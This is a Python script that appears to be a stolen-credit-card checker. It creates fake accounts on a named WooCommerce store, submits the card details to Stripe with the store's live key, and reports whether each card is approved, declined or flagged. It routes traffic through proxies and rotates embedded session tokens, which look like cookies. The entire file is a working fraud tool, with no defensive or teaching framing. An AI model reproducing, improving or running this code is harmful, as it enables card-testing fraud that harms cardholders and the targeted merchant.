import aiohttp
import re
import random
import string
from bs4 import BeautifulSoup

async def fetch_nonce(session, url, pattern, proxy=None):
    try:
        async with session.get(url, proxy=proxy) as response:
            text = await response.text()
            return re.search(pattern, text).group(1)
    except:
        return None

async def Tele(ccx, user_agent, proxy=None, email=None):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "Invalid CC format"
    
    n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
    yy = yy.replace("20", "") if "20" in yy else yy

    # Token rotation logic
    try:
        with open('fileb3.txt', 'r+') as file:
            lines = file.readlines()
            if len(lines) == 0:
                lines = DEFAULT_LINES.split('\n')
            
            first_line = lines[0].strip()
            available_lines = [line.strip() for line in lines if line.strip() != first_line]
            
            if not available_lines:
                big = first_line
            else:
                big = random.choice(available_lines)
            
            file.seek(0)
            file.truncate()
            file.write(big + '\n')
    except FileNotFoundError:
        return "Token file not found"

    headers = {
        "User-Agent": user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
            # Registration nonce
            nonce = await fetch_nonce(
                session,
                'https://www.dragonworksperformance.com/my-account',
                r'name="woocommerce-register-nonce" value="(.*?)"',
                proxy
            )
            if not nonce:
                return "Nonce fetch failed"

            # Registration data
            reg_data = {
                "email": email or f"{''.join(random.choices(string.ascii_lowercase, k=8))}@gmail.com",
                "woocommerce-register-nonce": nonce,
                "register": "Register"
            }

            async with session.post(
                'https://www.dragonworksperformance.com/my-account',
                data=reg_data,
                proxy=proxy
            ) as response:
                if response.status != 200:
                    return "Registration failed"

            # Payment nonce
            payment_nonce = await fetch_nonce(
                session,
                'https://www.dragonworksperformance.com/my-account/add-payment-method/',
                r'"createAndConfirmSetupIntentNonce":"(.*?)"',
                proxy
            )
            if not payment_nonce:
                return "Payment nonce failed"

            # Stripe integration
            stripe_data = {
                "type": "card",
                "card[number]": n,
                "card[cvc]": cvc,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "billing_details[address][postal_code]": "10080",
                "billing_details[address][country]": "US",
                "key": "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN",
            }

            async with session.post(
                'https://api.stripe.com/v1/payment_methods',
                data=stripe_data,
                proxy=proxy
            ) as stripe_res:
                stripe_json = await stripe_res.json()
                if 'id' not in stripe_json:
                    return "Stripe method failed"
                payment_id = stripe_json['id']

            # Payment confirmation
            confirm_data = {
                "action": "create_and_confirm_setup_intent",
                "wc-stripe-payment-method": payment_id,
                "_ajax_nonce": payment_nonce,
            }

            async with session.post(
                'https://www.dragonworksperformance.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
                data=confirm_data,
                proxy=proxy
            ) as response:
                result_text = await response.text()
                
                if 'Payment method successfully added.' in result_text:
                    return "Approved"
                elif 'risk_threshold' in result_text:
                    return "Risk detected"
                elif 'Duplicate' in result_text:
                    return "Duplicate"
                elif 'Insufficient Funds' in result_text:
                    return "Insufficient Funds"
                else:
                    match = re.search(r'Reason: (.+?)\s*</li>', result_text)
                    return match.group(1) if match else "Unknown error"

    except Exception as e:
        return f"Processing error: {str(e)}"

DEFAULT_LINES = """hxhcdrr%7C1713641609%7CXOJGK2xFYyXD6Wom3p2Cujj2ZkzyHqXGk13kFuIl5z2%7Cedf540bbe280f3cab93eebcbdb30556e244f9cbfd6b72021d7ea61d6330bc024
jsnxuwv%7C1713641702%7CLuntNS8UCY3lTvN6Yq0pXDIWhRoQN6T2rIJcVUYHqrW%7C81172a53f2d4f6da23bb1b177581990c34ac15331baad10c4d3bad3500cd0559
bdjqisha%7C1713641764%7C6XL7TRIFD9CrHleBLzzCSt7ymVS4pAGUu5mYFW0s5XN%7C84adb5191193048c127086078a87c34bcf50e586791ccd976e5dd088b037346b
djdnsbba%7C1713641897%7CL5FleSTWtIImxvKpB3JvEdk09qZLTGEPUaxNadcBsno%7C7ebd4c043b84acda974813d5eaf330f62d91fad75f7ee3d0300f06abc52bcaf4"""